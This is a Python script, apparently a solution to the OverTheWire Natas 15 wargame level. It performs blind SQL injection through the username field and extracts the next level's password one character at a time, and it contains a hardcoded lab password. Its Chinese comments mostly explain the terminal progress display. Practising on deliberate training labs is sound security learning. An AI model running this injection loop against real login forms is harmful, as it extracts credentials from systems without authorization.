import requests
import time
import os
from requests.auth import HTTPBasicAuth

# 这一行是为了强制唤醒 Windows PowerShell/CMD 的 ANSI 颜色和光标控制功能
os.system('')

Natas15_psw = 'GB6USCJYJjwLyYhZUNkE1NwDueiTow6g'
# 1. 建立长连接 Session
s = requests.Session()
s.auth = HTTPBasicAuth('natas15', Natas15_psw) 
url = "http://natas15.natas.labs.overthewire.org/index.php"

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

spinner = ['|', '/', '-', '\\']
spin_idx = 0

print("[*] Starting Blind SQL Injection...\n") # 额外加一个 \n 腾出两行的空间

for i in range(32):
    for char in chars:
        spin_char = spinner[spin_idx % 4]
        spin_idx += 1
        
        # ================= UI =================
        # \r 回到第一行开头，打印当前猜测，\033[K 清除第一行尾部残留
        # \n 换到第二行，\r 回到第二行开头，打印已确认密码，\033[K 清除第二行尾部残留
        # \033[A 光标上移一行！回到第一行，为下一次循环做准备
        ui = f"\r{password}{spin_char}\033[K\n\ralready guessed: {password}\033[K\033[A"
        print(ui, end="", flush=True)
        # end="" 不换行，flush=True 强制刷新
        # ===============================================
        #核心其实就是控制在哪行刷
        #并没有什么哪行是个变量ui之类的操作
        
        guess = password + char + "%"
        payload = 'natas16" AND password LIKE BINARY "' + guess + '" -- '
        
        
        while True:
            try:
                response = s.post(url, data={"username": payload}, timeout=3)
                break 
            except requests.exceptions.RequestException:
                # 如果网络卡顿，UI 依然保持双行结构，只是第一行变成警告
                warn_ui = f"\r[!] Lag... Retrying {char}\033[K\n\ralready guessed: {password}\033[K\033[A"
                print(warn_ui, end="", flush=True)
                time.sleep(1)
        
        # 检查是否猜中
        if "This user exists" in response.text:
            password += char
            break # 跳出字母循环，开始猜下一个位置

# 结束后，打印两个换行符 \n\n，把光标推到 UI 下面，防止终端提示符覆盖
print(f"\n\n[SUCCESS] Final Password for Natas 16: {password}")
